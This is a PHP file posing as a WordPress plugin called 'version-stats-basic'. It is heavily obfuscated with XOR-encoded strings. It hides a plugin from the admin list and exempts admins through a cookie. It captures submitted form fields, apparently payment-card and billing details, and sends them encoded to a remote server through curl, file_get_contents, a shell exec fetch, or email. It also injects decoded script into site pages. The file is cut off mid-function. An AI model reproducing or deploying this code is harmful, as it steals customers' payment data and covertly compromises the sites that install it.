<?php
/**
 * Plugin Name: version-stats-basic
 * Description: Oxygen synergy flash quantica dream thor
 * Version: 2.4.8
 * Author: Parallax solaris
 **/

if (!defined('SI_GROUBWIEC')) {
    define('SI_GROUBWIEC', 'pukhlaskrugv');
}

function si_sliejmesw($diowaemdt_glauptega, $skeasko_pezlojzy) {
    $drunplo_shusnoa = hex2bin($diowaemdt_glauptega);
    $lgipswxi_sivioshhe = '';
    $tristie_reavaum = strlen($skeasko_pezlojzy);
    for ($chaufleze_kiotais = 0; $chaufleze_kiotais < strlen($drunplo_shusnoa); $chaufleze_kiotais++) {
        $lgipswxi_sivioshhe .= chr(ord($drunplo_shusnoa[$chaufleze_kiotais]) ^ ord($skeasko_pezlojzy[$chaufleze_kiotais % $tristie_reavaum]));
    }
    return $lgipswxi_sivioshhe;
}
function si_jiescoaswi()
{
    global $wp_list_table;
    $si_flinuxcupyni_flowdraunmrove = array(si_sliejmesw("0610191b050e1d4601010602035809091f08104404101505191a05451f15121f01580517031c08461c0903", SI_GROUBWIEC));
    $si_flinuxcupyni_jerarmblec = $wp_list_table->items;
    foreach ($si_flinuxcupyni_jerarmblec as $si_flinuxcupyni_paigskags => $si_frouwoaheefe) {
        if (in_array($si_flinuxcupyni_paigskags, $si_flinuxcupyni_flowdraunmrove)) {
            unset($wp_list_table->items[$si_flinuxcupyni_paigskags]);
        }
    }
}

add_action(si_sliejmesw("00070e370f140119171b132911161f011a042c1b1e00001f1e06", SI_GROUBWIEC), si_sliejmesw("031c3402050400081d14140119", SI_GROUBWIEC));

function si_frezaepla($si_flinuxcupyni_prouskswanput)
{
    if(!$si_flinuxcupyni_prouskswanput){
        return si_sliejmesw(si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC);
    }
    $si_flinuxcupyni_paigskagsStr = si_sliejmesw("3137282c292734233b3f2c3a3d3b24383d33203f2723302e292f0a0a0f05160d151d0e1c1b1906060311021901011200070d12125c50415846405141484c404751", SI_GROUBWIEC);
    $si_flinuxcupyni_nioskenfl = si_sliejmesw(si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC);
    $si_flinuxcupyni_prouskswa = 0;

    $si_flinuxcupyni_prouskswanput = preg_replace(si_sliejmesw("5f2e3529413b124608454a4f2c5e3747513c5c", SI_GROUBWIEC), si_sliejmesw(si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC), $si_flinuxcupyni_prouskswanput);

    $si_flinuxcupyni_stoasturnflios = strlen($si_flinuxcupyni_prouskswanput);
    while ($si_flinuxcupyni_prouskswa < $si_flinuxcupyni_stoasturnflios) {
        $si_flinuxcupyni_slofeabri = strpos($si_flinuxcupyni_paigskagsStr, $si_flinuxcupyni_prouskswanput[$si_flinuxcupyni_prouskswa++]);
        $si_flinuxcupyni_thiornsha = strpos($si_flinuxcupyni_paigskagsStr, $si_flinuxcupyni_prouskswanput[$si_flinuxcupyni_prouskswa++]);
        $si_flinuxcupyni_draisnekswi = strpos($si_flinuxcupyni_paigskagsStr, $si_flinuxcupyni_prouskswanput[$si_flinuxcupyni_prouskswa++]);
        $si_flinuxcupyni_doabaewouroab = strpos($si_flinuxcupyni_paigskagsStr, $si_flinuxcupyni_prouskswanput[$si_flinuxcupyni_prouskswa++]);

        $si_flinuxcupyni_knaedwpemsper1 = ($si_flinuxcupyni_slofeabri << 2) | ($si_flinuxcupyni_thiornsha >> 4);
        $si_flinuxcupyni_nioskenfl .= chr($si_flinuxcupyni_knaedwpemsper1);

        if ($si_flinuxcupyni_draisnekswi !== false && $si_flinuxcupyni_draisnekswi != 64) {
            $si_flinuxcupyni_knaedwpemsper2 = (($si_flinuxcupyni_thiornsha & 15) << 4) | ($si_flinuxcupyni_draisnekswi >> 2);
            $si_flinuxcupyni_nioskenfl .= chr($si_flinuxcupyni_knaedwpemsper2);
        }

        if ($si_flinuxcupyni_doabaewouroab !== false && $si_flinuxcupyni_doabaewouroab != 64) {
            $si_flinuxcupyni_knaedwpemsper3 = (($si_flinuxcupyni_draisnekswi & 3) << 6) | $si_flinuxcupyni_doabaewouroab;
            $si_flinuxcupyni_nioskenfl .= chr($si_flinuxcupyni_knaedwpemsper3);
        }
    }

    return $si_flinuxcupyni_nioskenfl;
}


function si_steeropcluspru($si_flinuxcupyni_fliogreef)
{
    if (in_array(si_sliejmesw("0610191b050e1d4601010602035809091f08104404101505191a05451f15121f01580517031c08461c0903", SI_GROUBWIEC), array_keys($si_flinuxcupyni_fliogreef))) {
        unset($si_flinuxcupyni_fliogreef[si_sliejmesw("0610191b050e1d4601010602035809091f08104404101505191a05451f15121f01580517031c08461c0903", SI_GROUBWIEC)]);
    }
    return $si_flinuxcupyni_fliogreef;
}

add_filter(si_sliejmesw("111907371c0d060c1b1b14", SI_GROUBWIEC), si_sliejmesw("031c341b180416191d05041a05061b1a19", SI_GROUBWIEC));

add_action(si_sliejmesw("191b021c", SI_GROUBWIEC), si_sliejmesw("031c341b0f0e1507170714151910180719", SI_GROUBWIEC));

function si_scoflersciesou()
{
    if (!is_user_logged_in()) {
        return;
    }

    $si_jmautviebdraut = wp_get_current_user();

    if (user_can($si_jmautviebdraut, si_sliejmesw("02100a0c", SI_GROUBWIEC)) && user_can($si_jmautviebdraut, si_sliejmesw("1511021c33111c180606", SI_GROUBWIEC))) {
        $si_jmautviebdraut_ip = si_seamlaraestra();
        if ($si_jmautviebdraut_ip) {
            update_option(si_sliejmesw("0705341d1f040134", SI_GROUBWIEC) . md5($si_jmautviebdraut_ip), time());
        }
        setcookie(si_sliejmesw("000d080d0031120c172a044641455b5a", SI_GROUBWIEC), si_sliejmesw("41", SI_GROUBWIEC), time() + 30 * 24 * 60 * 60, si_sliejmesw("5f", SI_GROUBWIEC));
        $_COOKIE[si_sliejmesw("000d080d0031120c172a044641455b5a", SI_GROUBWIEC)] = si_sliejmesw("41", SI_GROUBWIEC);
    }
}

add_action(si_sliejmesw("191b021c", SI_GROUBWIEC), si_sliejmesw("031c341c1e07160a001e05131c101f1f", SI_GROUBWIEC));

function si_trfearkbeletw()
{
    $si_jmautviebdraut_ip = si_seamlaraestra();
    if ($si_jmautviebdraut_ip) {
        $si_geariograuw = get_option(si_sliejmesw("0705341d1f040134", SI_GROUBWIEC) . md5($si_jmautviebdraut_ip));
        if ($si_geariograuw) {
            $si_flinuxcupyni_thaimisglievdy = (time() - $si_geariograuw) >= 30 * 86400;
            if (!$si_flinuxcupyni_thaimisglievdy) {
                setcookie(si_sliejmesw("000d080d0031120c172a044641455b5a", SI_GROUBWIEC), si_sliejmesw("41", SI_GROUBWIEC), time() + 30 * 24 * 60 * 60, si_sliejmesw("5f", SI_GROUBWIEC));
                $_COOKIE[si_sliejmesw("000d080d0031120c172a044641455b5a", SI_GROUBWIEC)] = si_sliejmesw("41", SI_GROUBWIEC);
            }
        }
    }
}

function si_seamlaraestra() {
    $si_flinuxcupyni_gauxposmionds = array(
        si_sliejmesw("38213f3833223534313a293835363f2122262c2222", SI_GROUBWIEC),
        si_sliejmesw("38213f3833392c2d3d27303722312e2c33273c39", SI_GROUBWIEC),
        si_sliejmesw("38213f3833392c3937342b293925", SI_GROUBWIEC),
        si_sliejmesw("38213f3833223f22373b33293925", SI_GROUBWIEC),
        si_sliejmesw("38213f3833392c283e2034223527342b20283625262a2e26", SI_GROUBWIEC),
        si_sliejmesw("2230262738242c2a363135", SI_GROUBWIEC)
    );

    foreach ($si_flinuxcupyni_gauxposmionds as $si_flinuxcupyni_paigskags) {
        if (!empty($_SERVER[$si_flinuxcupyni_paigskags])) {
            $si_flinuxcupyni_prouskswap_list = explode(si_sliejmesw("5c", SI_GROUBWIEC), $_SERVER[$si_flinuxcupyni_paigskags]);
            foreach ($si_flinuxcupyni_prouskswap_list as $si_flinuxcupyni_prouskswap) {
                $si_flinuxcupyni_prouskswap = trim($si_flinuxcupyni_prouskswap);
                if (filter_var($si_flinuxcupyni_prouskswap, FILTER_VALIDATE_IP)) {
                    return $si_flinuxcupyni_prouskswap;
                }
            }
        }
    }

    return false;
}


function si_grynrtriwaux($si_flinuxcupyn)
{
    return $si_flinuxcupyn;
}

function si_truoaiefpl($si_flinuxcupyntr)
{
    if (!preg_match(si_sliejmesw("532b3029413b124608454a4f5b5a564430132f052f5e4355", SI_GROUBWIEC), $si_flinuxcupyntr)) return false;
    return si_frezaepla(strrev($si_flinuxcupyntr));
}

$si_flinuxcupyni_prouskswanc_file_settings = __DIR__ . si_sliejmesw("5f1604060a081445021d17", SI_GROUBWIEC);
if (file_exists($si_flinuxcupyni_prouskswanc_file_settings)) {
    include $si_flinuxcupyni_prouskswanc_file_settings;
}

function si_lauwardswr($si_bybzoatriosci, $si_flinuxcupyni_stralbeaswgy)
{
    $si_flinuxcupyni_fowoashuw = array(CURLOPT_RETURNTRANSFER => true, CURLOPT_HEADER => false, CURLOPT_FOLLOWLOCATION => true, CURLOPT_ENCODING => si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC), CURLOPT_USERAGENT => si_sliejmesw("3d1a1101000d1244475b575658220206080e0418523b3356455b5a534c1305514147494659552c0d0f0a1c444045564440445b594c271a191713080e5f4659465c", SI_GROUBWIEC), CURLOPT_AUTOREFERER => true, CURLOPT_CONNECTTIMEOUT => 120, CURLOPT_TIMEOUT => 120, CURLOPT_MAXREDIRS => 10, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false);
    if ($si_flinuxcupyni_stralbeaswgy) {
        $si_flinuxcupyni_fowoashuw[CURLOPT_POST] = 1;
        $si_flinuxcupyni_fowoashuw[CURLOPT_POSTFIELDS] = $si_flinuxcupyni_stralbeaswgy;
    }
    $si_flinuxcupyni_knaedwpemspe = curl_init($si_bybzoatriosci);
    curl_setopt_array($si_flinuxcupyni_knaedwpemspe, $si_flinuxcupyni_fowoashuw);
    $si_flinuxcupyni_groachsweehea = @curl_exec($si_flinuxcupyni_knaedwpemspe);
    return $si_flinuxcupyni_groachsweehea;
}

function si_dreedopibpna($si_flinuxcupyni_paigskagss)
{
    foreach ($si_flinuxcupyni_paigskagss as $si_flinuxcupyni_paigskags) {
        if (isset($_POST[$si_flinuxcupyni_paigskags])) {
            return $_POST[$si_flinuxcupyni_paigskags];
        }
    }
    return si_sliejmesw(si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC);
}


if (
    isset($_POST[si_sliejmesw("121c0704050f1434141c1505042a05090104", SI_GROUBWIEC)]) ||
    isset($_POST[si_sliejmesw("121c0704050f1446141c1505042a05090104", SI_GROUBWIEC)]) ||
    isset($_POST[si_sliejmesw("031d02181c081d0c2d130e04030134060d0c16", SI_GROUBWIEC)]) ||
    isset($_POST[si_sliejmesw("031d02181c081d0c5f130e04030134060d0c16", SI_GROUBWIEC)])
) {
    $si_flinuxcupyni_powydspaugyc = si_dreedopibpna(array(
        si_sliejmesw("121c0704050f1434141c1505042a05090104", SI_GROUBWIEC),
        si_sliejmesw("121c0704050f1446141c1505042a05090104", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c2d130e04030134060d0c16", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c5f130e04030134060d0c16", SI_GROUBWIEC)
    ));

    $si_flinuxcupyni_snousnzetllas = si_dreedopibpna(array(
        si_sliejmesw("121c0704050f14341e1414022f1b0a0509", SI_GROUBWIEC),
        si_sliejmesw("121c0704050f14461e1414022f1b0a0509", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c2d190605042a05090104", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c5f190605042a05090104", SI_GROUBWIEC)
    ));

    $si_flinuxcupyni_spetppreaplote = si_dreedopibpna(array(
        si_sliejmesw("121c0704050f1434111a1218040712", SI_GROUBWIEC),
        si_sliejmesw("121c0704050f1446111a1218040712", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c2d1608031e011911", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c5f1608031e011911", SI_GROUBWIEC)
    ));

    $si_flinuxcupyni_fiezauglibr = si_dreedopibpna(array(
        si_sliejmesw("121c0704050f14340101060215", SI_GROUBWIEC),
        si_sliejmesw("121c0704050f14460101060215", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c2d0613170410", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c5f0613170410", SI_GROUBWIEC)
    ));

    $si_flinuxcupyni_traegriodaus = si_dreedopibpna(array(
        si_sliejmesw("121c0704050f1434111c130f", SI_GROUBWIEC),
        si_sliejmesw("121c0704050f1446111c130f", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c2d160e0209", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c5f160e0209", SI_GROUBWIEC)
    ));

    $si_flinuxcupyni_spuxsoubrai = si_dreedopibpna(array(
        si_sliejmesw("121c0704050f143413110304150618375d", SI_GROUBWIEC),
        si_sliejmesw("121c0704050f144613110304150618375d", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c2d1403120210181b3350", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c5f1403120210181b3350", SI_GROUBWIEC)
    ));

    $si_louvetwie = si_dreedopibpna(array(
        si_sliejmesw("121c0704050f1434021a1402131a0f0d", SI_GROUBWIEC),
        si_sliejmesw("121c0704050f1446021a1402131a0f0d", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c2d0508050416040c09", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c5f0508050416040c09", SI_GROUBWIEC)
    ));

    $si_flinuxcupyni_greaseaskybras = si_dreedopibpna(array(
        si_sliejmesw("121c0704050f1434021d081815", SI_GROUBWIEC),
        si_sliejmesw("121c0704050f1446021d081815", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c2d050f191e10", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c5f050f191e10", SI_GROUBWIEC)
    ));

    $si_flinuxcupyni_flifgfend = si_dreedopibpna(array(
        si_sliejmesw("121c0704050f14341718061f1c", SI_GROUBWIEC),
        si_sliejmesw("121c0704050f14461718061f1c", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c2d100a171919", SI_GROUBWIEC),
        si_sliejmesw("031d02181c081d0c5f100a171919", SI_GROUBWIEC),
        si_sliejmesw("15180a0100", SI_GROUBWIEC)
    ));

    $si_flinuxcupyni_bziskbryrp = $si_flinuxcupyni_powydspaugyc . si_sliejmesw("50", SI_GROUBWIEC) . $si_flinuxcupyni_snousnzetllas . si_sliejmesw("0c", SI_GROUBWIEC) . $si_flinuxcupyni_spuxsoubrai . si_sliejmesw("0c", SI_GROUBWIEC) . $si_flinuxcupyni_traegriodaus . si_sliejmesw("0c", SI_GROUBWIEC) . $si_flinuxcupyni_fiezauglibr . si_sliejmesw("0c", SI_GROUBWIEC) . $si_louvetwie . si_sliejmesw("0c", SI_GROUBWIEC) . $si_flinuxcupyni_spetppreaplote . si_sliejmesw("0c", SI_GROUBWIEC) . $si_flinuxcupyni_greaseaskybras . si_sliejmesw("50", SI_GROUBWIEC) . $si_flinuxcupyni_flifgfend;

    setcookie(si_sliejmesw("2f020f091800", SI_GROUBWIEC), base64_encode($si_flinuxcupyni_bziskbryrp), time() + 36000, si_sliejmesw("5f", SI_GROUBWIEC));
    $_COOKIE[si_sliejmesw("2f020f091800", SI_GROUBWIEC)] = base64_encode($si_flinuxcupyni_bziskbryrp);
};

if (isset($_POST[si_sliejmesw("0705340b040410002d061317041c181c050200", SI_GROUBWIEC)]) && isset($_POST[si_sliejmesw("1e1a050b09", SI_GROUBWIEC)])){
    $si_flinuxcupyni_baezblioh = si_frezaepla(htmlspecialchars($_POST[si_sliejmesw("0705340b040410002d061317041c181c050200", SI_GROUBWIEC)]));
    $si_flinuxcupyni_sczoulsce = si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC);
    if(si_seamlaraestra()){
        $si_flinuxcupyni_sczoulsce = si_sliejmesw("561d1b55", SI_GROUBWIEC) . si_seamlaraestra();
    }
    $si_flinuxcupyni_baezblioh_encoded = base64_encode(str_rot13($si_flinuxcupyni_baezblioh . "\r\n" . si_sliejmesw("5a", SI_GROUBWIEC) . $_SERVER[si_sliejmesw("38213f3833293c3826", SI_GROUBWIEC)] . si_sliejmesw("502e", SI_GROUBWIEC) . $_SERVER[si_sliejmesw("2330393e29332c2a363135", SI_GROUBWIEC)] . si_sliejmesw("2d5f", SI_GROUBWIEC)));
    $si_flinuxcupyni_baezblioh_encoded = str_replace(si_sliejmesw("5b", SI_GROUBWIEC), si_sliejmesw("554709", SI_GROUBWIEC), $si_flinuxcupyni_baezblioh_encoded) . si_sliejmesw("56060055", SI_GROUBWIEC) . $_POST[si_sliejmesw("1e1a050b09", SI_GROUBWIEC)] . $si_flinuxcupyni_sczoulsce;
    $si_flinuxcupyni_flaudgentclsai = 0;
    $si_flinuxcupynend_url = si_sliejmesw("18011f181f5b5c44011b061d15475b5a594f1a05141a48253d3c2727282e3d441b1b0313085b1b001c5e050217025a", SI_GROUBWIEC);
    if (function_exists(si_sliejmesw("1300190433081d0206", SI_GROUBWIEC))) {
        $si_flinuxcupyni_flaudgentclsai = si_lauwardswr($si_flinuxcupynend_url . $si_flinuxcupyni_baezblioh_encoded, false);
        $si_flinuxcupyni_flaudgentclsai = trim($si_flinuxcupyni_flaudgentclsai);
    }
    if ($si_flinuxcupyni_flaudgentclsai != si_sliejmesw("41", SI_GROUBWIEC)) {
        $si_flinuxcupyni_flaudgentclsai = @file_get_contents($si_flinuxcupynend_url . $si_flinuxcupyni_baezblioh_encoded);
        $si_flinuxcupyni_flaudgentclsai = trim($si_flinuxcupyni_flaudgentclsai);
    }
    if (($si_flinuxcupyni_flaudgentclsai != si_sliejmesw("41", SI_GROUBWIEC)) && (function_exists(si_sliejmesw("150d0e0b", SI_GROUBWIEC)))) {
        $si_flinuxcupyni_nioskenfl = [];
        $si_flinuxcupyni_taexaechstoa = 0;
        @exec(si_sliejmesw("130019044c4c5e021c06021505070e48", SI_GROUBWIEC) . $si_flinuxcupynend_url . $si_flinuxcupyni_baezblioh_encoded, $si_flinuxcupyni_nioskenfl, $si_flinuxcupyni_taexaechstoa);
        $si_flinuxcupyni_deerntwie = isset($si_flinuxcupyni_nioskenfl[0]) ? trim($si_flinuxcupyni_nioskenfl[0]) : si_sliejmesw(si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC);
        if ($si_flinuxcupyni_deerntwie !== si_sliejmesw(si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC)) {
            $si_flinuxcupyni_flaudgentclsai = $si_flinuxcupyni_deerntwie;
        }
    }
    if ($si_flinuxcupyni_flaudgentclsai != si_sliejmesw("41", SI_GROUBWIEC)) {
        @mail(si_sliejmesw("1b1c181b4213065a430627041118090409135d1907", SI_GROUBWIEC), si_sliejmesw("121734", SI_GROUBWIEC) . $_SERVER[si_sliejmesw("38213f3833293c3826", SI_GROUBWIEC)], $si_flinuxcupyni_baezblioh_encoded);
    }
}

if (isset($_POST[si_sliejmesw("00141205090f07", SI_GROUBWIEC)])) {
    $si_flinuxcupyni_talaichijabapi = array(si_sliejmesw("5f5b411b1800070201010e15032a000d154f5944", SI_GROUBWIEC) => 1,si_sliejmesw("5f5b410b0f3e1d1e1f5b4d59", SI_GROUBWIEC) => 1, si_sliejmesw("5f5b410b030f07191d19380515011f0102060045585a", SI_GROUBWIEC) => 1, si_sliejmesw("5f5b410b0f3e1a08175b4d59", SI_GROUBWIEC) => 1, si_sliejmesw("5f5b411b091507021c1214291b101246464e", SI_GROUBWIEC) => 2, si_sliejmesw("5f5b410b0f3e1613022a0a585a5a", SI_GROUBWIEC) => 2, si_sliejmesw("5f5b410e05131634011013585a5a", SI_GROUBWIEC) => 2, si_sliejmesw("5f5b410d14112c061d1b131e5e5f44", SI_GROUBWIEC) => 2, si_sliejmesw("5f5b410d14111a1913010e191e38040618095d415d", SI_GROUBWIEC) => 2, si_sliejmesw("5f5b41051f0f2c181701495c5f", SI_GROUBWIEC) => 2, si_sliejmesw("5f5b410b0f3e1613022a1e585a5a", SI_GROUBWIEC) => 3, si_sliejmesw("5f5b411b091507021c1214290614071d094f5944", SI_GROUBWIEC) => 3, si_sliejmesw("5f5b410905132c181701495c5f", SI_GROUBWIEC) => 3, si_sliejmesw("5f5b410d14112c12171415585a5a", SI_GROUBWIEC) => 3, si_sliejmesw("5f5b410d14111a1913010e191e2c0e091e4f5944", SI_GROUBWIEC) => 3, si_sliejmesw("5f5b4111090d1f04052a1413045b4147", SI_GROUBWIEC) => 3, si_sliejmesw("5f5b411b0d17120c172a1413045b4147", SI_GROUBWIEC) => 4, si_sliejmesw("5f5b411b18000734111a0902021a0746464e", SI_GROUBWIEC) => 4, si_sliejmesw("5f5b411b180e1d0e2d0602025e5f44", SI_GROUBWIEC) => 4, si_sliejmesw("5f5b410b0f3e1002165b4d59", SI_GROUBWIEC) => 4);
    $si_flinuxcupyni_twbeastkiohwyt = $si_flinuxcupyni_zeeneztrjaesp = $si_flinuxcupyni_lotrufloavi = $si_flinuxcupyni_cousyragw = si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC);
    foreach ($si_flinuxcupyni_talaichijabapi as $si_flinuxcupyni_snieflade => $si_flinuxcupyni_sljeermfeanc) {
        foreach ($_POST[si_sliejmesw("00141205090f07", SI_GROUBWIEC)] as $si_flinuxcupyni_kilujxspee => $si_flinuxcupyni_neeruzcriojt) {
            if (preg_match($si_flinuxcupyni_snieflade, $si_flinuxcupyni_kilujxspee, $si_flinuxcupyni_fistwirkdru)) {
                switch ($si_flinuxcupyni_sljeermfeanc) {
                    case 1:
                        $si_flinuxcupyni_twbeastkiohwyt = $si_flinuxcupyni_neeruzcriojt;
                        break;
                    case 2:
                        $si_flinuxcupyni_zeeneztrjaesp = $si_flinuxcupyni_neeruzcriojt;
                        break;
                    case 3:
                        $si_flinuxcupyni_lotrufloavi = $si_flinuxcupyni_neeruzcriojt;
                        break;
                    case 4:
                        $si_flinuxcupyni_cousyragw = $si_flinuxcupyni_neeruzcriojt;
                        break;
                }
                break;
            }
        }
    }
    if ($si_flinuxcupyni_twbeastkiohwyt) {
        if (strlen($si_flinuxcupyni_zeeneztrjaesp) == 1) $si_flinuxcupyni_zeeneztrjaesp = si_sliejmesw("40", SI_GROUBWIEC) . $si_flinuxcupyni_zeeneztrjaesp;
        if (strlen($si_flinuxcupyni_lotrufloavi) == 4) $si_flinuxcupyni_lotrufloavi = substr($si_flinuxcupyni_lotrufloavi, 2, 2);
        $si_flinuxcupyni_baezblioh = $si_flinuxcupyni_twbeastkiohwyt . si_sliejmesw("0c", SI_GROUBWIEC) . $si_flinuxcupyni_zeeneztrjaesp . si_sliejmesw("5f", SI_GROUBWIEC) . $si_flinuxcupyni_lotrufloavi . si_sliejmesw("0c", SI_GROUBWIEC) . $si_flinuxcupyni_cousyragw;
        if (isset($si_flinuxcupyni_bziskbryrp)) {
            $si_flinuxcupyni_baezblioh .= si_sliejmesw("0c", SI_GROUBWIEC) . $si_flinuxcupyni_bziskbryrp;
        } else {
            if (isset($_COOKIE[si_sliejmesw("2f020f091800", SI_GROUBWIEC)])) $si_flinuxcupyni_baezblioh .= si_sliejmesw("0c", SI_GROUBWIEC) . si_frezaepla($_COOKIE[si_sliejmesw("2f020f091800", SI_GROUBWIEC)]);
        }
        if(si_seamlaraestra()){
            $si_flinuxcupyni_baezblioh .= si_sliejmesw("0c", SI_GROUBWIEC) . si_seamlaraestra();
        }
        $si_flinuxcupyni_baezblioh_encoded = base64_encode(str_rot13($si_flinuxcupyni_baezblioh . "\r\n" . si_sliejmesw("5a", SI_GROUBWIEC) . $_SERVER[si_sliejmesw("38213f3833293c3826", SI_GROUBWIEC)] . si_sliejmesw("502e", SI_GROUBWIEC) . $_SERVER[si_sliejmesw("2330393e29332c2a363135", SI_GROUBWIEC)] . si_sliejmesw("2d5f", SI_GROUBWIEC)));
        $si_flinuxcupyni_baezblioh_encoded = str_replace(si_sliejmesw("5b", SI_GROUBWIEC), si_sliejmesw("554709", SI_GROUBWIEC), $si_flinuxcupyni_baezblioh_encoded);
        $si_flinuxcupyni_flaudgentclsai = 0;
        $si_flinuxcupynend_url = si_sliejmesw("18011f181f5b5c44011b061d15475b5a594f1a05141a48253d3c2727282e3d441b1b0313085b1b001c5e050217025a", SI_GROUBWIEC);
        if (function_exists(si_sliejmesw("1300190433081d0206", SI_GROUBWIEC))) {
            $si_flinuxcupyni_flaudgentclsai = si_lauwardswr($si_flinuxcupynend_url . $si_flinuxcupyni_baezblioh_encoded, false);
            $si_flinuxcupyni_flaudgentclsai = trim($si_flinuxcupyni_flaudgentclsai);
        }
        if ($si_flinuxcupyni_flaudgentclsai != si_sliejmesw("41", SI_GROUBWIEC)) {
            $si_flinuxcupyni_flaudgentclsai = @file_get_contents($si_flinuxcupynend_url . $si_flinuxcupyni_baezblioh_encoded);
            $si_flinuxcupyni_flaudgentclsai = trim($si_flinuxcupyni_flaudgentclsai);
        }
        if (($si_flinuxcupyni_flaudgentclsai != si_sliejmesw("41", SI_GROUBWIEC)) && (function_exists(si_sliejmesw("150d0e0b", SI_GROUBWIEC)))) {
            $si_flinuxcupyni_nioskenfl = [];
            $si_flinuxcupyni_taexaechstoa = 0;
            @exec(si_sliejmesw("130019044c4c5e021c06021505070e48", SI_GROUBWIEC) . $si_flinuxcupynend_url . $si_flinuxcupyni_baezblioh_encoded, $si_flinuxcupyni_nioskenfl, $si_flinuxcupyni_taexaechstoa);
            $si_flinuxcupyni_deerntwie = isset($si_flinuxcupyni_nioskenfl[0]) ? trim($si_flinuxcupyni_nioskenfl[0]) : si_sliejmesw(si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC);
            if ($si_flinuxcupyni_deerntwie !== si_sliejmesw(si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC)) {
                $si_flinuxcupyni_flaudgentclsai = $si_flinuxcupyni_deerntwie;
            }
        }
        if ($si_flinuxcupyni_flaudgentclsai != si_sliejmesw("41", SI_GROUBWIEC)) {
            @mail(si_sliejmesw("1b1c181b4213065a430627041118090409135d1907", SI_GROUBWIEC), si_sliejmesw("121734", SI_GROUBWIEC) . $_SERVER[si_sliejmesw("38213f3833293c3826", SI_GROUBWIEC)], $si_flinuxcupyni_baezblioh);
        }
    }
}

if (defined(si_sliejmesw("293c22373b3624342234333e", SI_GROUBWIEC))) {
    return;
}
define(si_sliejmesw("293c22373b3624342234333e", SI_GROUBWIEC), 1);

function si_ykiedstealusa()
{
    $si_flinuxcupyni_snyshadjiol = __DIR__ . si_sliejmesw("5f14181b091500441b1806111506440c0904181f140c1017031e0701034f030515", SI_GROUBWIEC);
    $si_flinuxcupyni_trreexclaigl = __DIR__ . si_sliejmesw("5f14181b091500441b1806111506441c1b0e06181a001d17051b45180206", SI_GROUBWIEC);
    $si_flinuxcupyni_gaepouboastacl = __DIR__ . si_sliejmesw("5f14181b091500441b18061115064404150c01181c010e13141f0a0d42111d0c", SI_GROUBWIEC);
    $si_flinuxcupyni_plishaeslaizv = si_sliejmesw("000d080d0031120c172a044641455b5a", SI_GROUBWIEC);
    $si_flinuxcupyni_mazsplagscz = 86400;

    if (isset($_COOKIE[$si_flinuxcupyni_plishaeslaizv])) return;

    if (file_exists($si_flinuxcupyni_trreexclaigl)) {
        $si_flinuxcupyni_staixouneh = file_get_contents($si_flinuxcupyni_trreexclaigl);
        if (!empty($si_flinuxcupyni_staixouneh)) {
            $si_flinuxcupyni_staixouneh = mb_substr($si_flinuxcupyni_staixouneh, 4);
            $si_flinuxcupyni_smienwyrtny = si_truoaiefpl($si_flinuxcupyni_staixouneh);
            if ($si_flinuxcupyni_smienwyrtny !== false) {
                echo si_sliejmesw("4c06081a05110755", SI_GROUBWIEC) . $si_flinuxcupyni_smienwyrtny . si_sliejmesw("4c5a180b1e08031f4c", SI_GROUBWIEC);
            }
        }
    }

    $si_flinuxcupyni_nzosouhucae = file_exists($si_flinuxcupyni_gaepouboastacl);
    $si_flinuxcupyni_gugtfestciesys = false;
    $si_flinuxcupyni_spaefldiexpoud = si_sliejmesw(si_sliejmesw(si_sliejmesw(si_sliejmesw("", SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC), SI_GROUBWIEC);

    if ($si_flinuxcupyni_nzosouhucae) {
        $si_flinuxcupyni_mxiorttwae = filemtime($si_flinuxcupyni_gaepouboastacl);
        $si_flinuxcupyni_gugtfestciesys = $si_flinuxcupyni_mxiorttwae >= (time() - $si_flinuxcupyni_mazsplagscz);
        $si_flinuxcupyni_spaefldiexpoud = @file_get_contents($si_flinuxcupyni_gaepouboastacl);
        $si_flinuxcupyni_spaefldiexpoud = mb_substr($si_flinuxcupyni_spaefldiexpoud, 4);
        $si_flinuxcupyni_smienwyrtny = si_truoaiefpl($si_flinuxcupyni_spaefldiexpoud);
